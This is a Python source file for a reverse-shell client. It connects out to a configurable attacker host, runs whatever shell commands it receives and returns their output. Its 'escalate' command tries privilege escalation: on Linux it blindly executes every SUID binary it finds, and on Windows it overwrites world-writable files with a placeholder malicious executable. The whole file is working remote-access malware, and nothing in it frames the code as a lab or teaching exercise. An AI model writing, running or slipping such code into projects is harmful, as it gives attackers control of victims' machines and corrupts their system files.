import socket
import subprocess
import os
import platform
import shutil
from dotenv import load_dotenv

dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
load_dotenv(dotenv_path)

TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))

def find_suid_binaries():
    suid_files = []
    for root, dirs, files in os.walk('/'):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                if os.stat(filepath).st_mode & 0o4000:
                    suid_files.append(filepath)
            except:
                continue
    return suid_files

def privilege_escalation_linux(suid_files):
    for suid_file in suid_files:
        try:
            os.system(suid_file)
        except:
            continue

def find_insecure_files():
    insecure_files = []
    for root, dirs, files in os.walk('C:\\'):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                if 'Everyone:(I)' in subprocess.check_output(['icacls', filepath]).decode():
                    insecure_files.append(filepath)
            except:
                continue
    return insecure_files

def privilege_escalation_windows(insecure_files):
    malicious_file = "C:\\Path\\To\\Malicious\\malicious.exe"
    for insecure_file in insecure_files:
        try:
            backup_file = insecure_file + '_backup'
            shutil.copyfile(insecure_file, backup_file)
            shutil.copyfile(malicious_file, insecure_file)
        except:
            continue

def reverse_shell(attacker_ip, attacker_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((attacker_ip, attacker_port))

    os_type = platform.system().lower()
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        elif command.lower() == 'escalate':
            if os_type == 'linux':
                suid_files = find_suid_binaries()
                if suid_files:
                    client_socket.send(f"SUID binaries found: {suid_files}\n".encode())
                    privilege_escalation_linux(suid_files)
                else:
                    client_socket.send(b"No SUID binaries found\n")
            elif os_type == 'windows':
                insecure_files = find_insecure_files()
                if insecure_files:
                    client_socket.send(f"Insecure files found: {insecure_files}\n".encode())
                    privilege_escalation_windows(insecure_files)
                else:
                    client_socket.send(b"No insecure files found\n")
        else:
            try:
                output = subprocess.check_output(command, shell=True)
            except subprocess.CalledProcessError as e:
                output = e.output
            client_socket.send(output)

    client_socket.close()

if __name__ == "__main__":
    reverse_shell(TARGET_IP, TARGET_PORT)